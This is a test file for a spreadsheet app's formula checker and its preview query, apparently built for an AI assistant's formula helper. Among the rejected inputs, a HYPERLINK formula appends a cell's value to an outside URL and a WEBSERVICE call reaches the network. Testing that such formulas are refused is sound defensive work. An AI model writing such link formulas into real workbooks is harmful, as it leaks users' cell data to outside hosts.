import { describe, expect, it } from "vitest"
import { FormulaEngine, previewFormula } from "../core/sheet/formula/index"
import { checkWrittenFormula, writtenFormulaProblem } from "../core/sheet/input/formulaCheck"
import { openKeys, sheetBody } from "./sheetKeysFixtures"

// The assistant's formula helper: a written formula checked (functions this app calculates, references into this
// workbook, never the target cell), then evaluated by the engine without writing a cell.

const SALES = sheetBody([
	["Region", "Amount"],
	["north", 10],
	["south", 20],
	["north", 5]
])

const TARGET = { sheets: ["Sales", "Other sheet"], sheet: "Sales", cell: { row: 4, col: 1 } }

describe("writtenFormulaProblem", () => {
	it("passes a formula of calculated functions over this workbook's cells", () => {
		expect(writtenFormulaProblem('=SUMIF(A2:A4,"north",B2:B4)', TARGET)).toBeNull()
		expect(writtenFormulaProblem('=_xlfn.XLOOKUP("south",A:A,B:B)', { ...TARGET, cell: { row: 4, col: 3 } })).toBeNull()
		expect(writtenFormulaProblem("='Other sheet'!A1*2", TARGET)).toBeNull()
	})

	it("refuses what does not read as a formula", () => {
		expect(writtenFormulaProblem("SUM(A1:A3)", TARGET)).toEqual({ kind: "malformed" })
		expect(writtenFormulaProblem("=SUM(A1:A3", TARGET)).toEqual({ kind: "malformed" })
		// en-US syntax only: ";" between arguments is another locale's.
		expect(writtenFormulaProblem("=SUM(A1;A3)", TARGET)).toEqual({ kind: "malformed" })
	})

	it("refuses unknown, uncalculated and refused functions", () => {
		expect(writtenFormulaProblem("=SUMMIT(A1:A3)", TARGET)).toEqual({ kind: "function", name: "SUMMIT", refused: false })
		expect(writtenFormulaProblem('=WEBSERVICE("https://example.com")', TARGET)).toEqual({
			kind: "function",
			name: "WEBSERVICE",
			refused: false
		})
		expect(writtenFormulaProblem('=HYPERLINK("https://example.com/?"&A1,"open")', TARGET)).toEqual({
			kind: "function",
			name: "HYPERLINK",
			refused: true
		})
		expect(writtenFormulaProblem('=SUM(INDIRECT("A1:A3"))', TARGET)).toEqual({ kind: "function", name: "INDIRECT", refused: true })
	})

	it("refuses references outside this workbook or past the sheet", () => {
		expect(writtenFormulaProblem("=Missing!A1", TARGET)).toEqual({ kind: "reference", sheet: "Missing" })
		expect(writtenFormulaProblem("=[1]Sales!A1", TARGET)).toEqual({ kind: "reference", sheet: null })
		expect(writtenFormulaProblem("=SUM(Table1[Amount])", TARGET)).toEqual({ kind: "reference", sheet: null })
	})

	it("refuses a reference to the cell the formula goes in", () => {
		expect(writtenFormulaProblem("=SUM(B:B)", TARGET)).toEqual({ kind: "circular" })
		expect(writtenFormulaProblem("=SUM(B2:B5)", TARGET)).toEqual({ kind: "circular" })
		expect(writtenFormulaProblem("=SUM(5:5)", TARGET)).toEqual({ kind: "circular" })
		expect(writtenFormulaProblem("=SUM(B2:B4)", TARGET)).toBeNull()
		expect(writtenFormulaProblem("='Other sheet'!B5", TARGET)).toBeNull()
	})
})

describe("the formulaPreview query", () => {
	it("evaluates on a formula-free workbook, writing no cell", async () => {
		const { session } = await openKeys({ sheets: [{ name: "Sales", body: SALES }] })

		await session.intent()

		expect(await session.query("formulaPreview", { sheet: 0, formula: '=SUMIF(A2:A4,"north",B2:B4)' })).toEqual({
			value: 15,
			error: false,
			rows: 1,
			cols: 1
		})
		expect(await session.query("formulaPreview", { sheet: 0, formula: "=B2/0" })).toEqual({
			value: "#DIV/0!",
			error: true,
			rows: 1,
			cols: 1
		})
		expect(await session.query("formulaPreview", { sheet: 0, formula: "=B2:B4*2" })).toEqual({
			value: 20,
			error: false,
			rows: 3,
			cols: 1
		})
		expect(await session.query("cell", { sheet: 0, row: 4, col: 1 })).toMatchObject({ input: "" })
		session.close()
	})

	it("refuses what the engine cannot take", async () => {
		const { session } = await openKeys({ sheets: [{ name: "Sales", body: SALES }] })

		await session.intent()

		expect(await session.query("formulaPreview", { sheet: 0, formula: "=SUM(B2:B4" })).toEqual({ refused: "formula" })
		expect(await session.query("formulaPreview", { sheet: 0, formula: "plain text" })).toEqual({ refused: "formula" })
		expect(await session.query("formulaPreview", { sheet: 0, formula: "=SUM(Table1[Amount])" })).toEqual({ refused: "formula" })
		session.close()
	})
})

describe("checkWrittenFormula", () => {
	it("checks first, then reads the engine's value, #NAME? as a refusal", async () => {
		const engine = new FormulaEngine(
			[
				{
					name: "Sales",
					rows: [
						["Region", "Amount"],
						["north", 10],
						["south", 20],
						["north", 5]
					],
					formulas: []
				}
			],
			[]
		)
		const asked: string[] = []
		const preview = (formula: string) => {
			asked.push(formula)

			return Promise.resolve(previewFormula(engine, 0, formula.slice(1)))
		}

		try {
			await expect(checkWrittenFormula('=SUMIF(A2:A4,"north",B2:B4)', TARGET, preview)).resolves.toEqual({
				ok: true,
				value: { value: 15, error: false, rows: 1, cols: 1 }
			})
			await expect(checkWrittenFormula("=SUM(Rate)", TARGET, preview)).resolves.toEqual({ ok: false, problem: { kind: "name" } })
			await expect(checkWrittenFormula("=SUM(B:B)", TARGET, preview)).resolves.toEqual({ ok: false, problem: { kind: "circular" } })
			expect(asked).toEqual(['=SUMIF(A2:A4,"north",B2:B4)', "=SUM(Rate)"])
		} finally {
			engine.destroy()
		}
	})
})
